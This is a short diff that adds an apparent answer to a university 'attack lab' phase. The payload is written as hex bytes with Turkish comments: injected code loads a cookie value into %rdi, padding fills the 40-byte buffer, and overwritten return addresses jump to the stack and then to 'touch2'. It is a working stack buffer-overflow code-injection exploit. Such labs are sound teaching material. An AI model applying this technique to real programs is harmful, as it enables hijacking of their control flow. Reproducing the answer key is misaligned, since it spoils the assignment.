@@ -1,0 +1,14 @@
+//%rdi kaydedicisini cookie değerine yüklüyoruz ve ret ile döndürüyoruz. 
+// yazdığımız kodu ekliyoruz.
+48 c7 c7 f1 1e d6 5c c3
+// 40 bayta tamamlıyoruz.
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+// %rsp kaydedicisinden Bufferımızın boyutunu çıkartıyoruz. %rsp value - 0x28
+78 04 67 55 00 00 00 00
+
+//touch 2 nin adresi
+6b 18 40 00 00 00 00 00
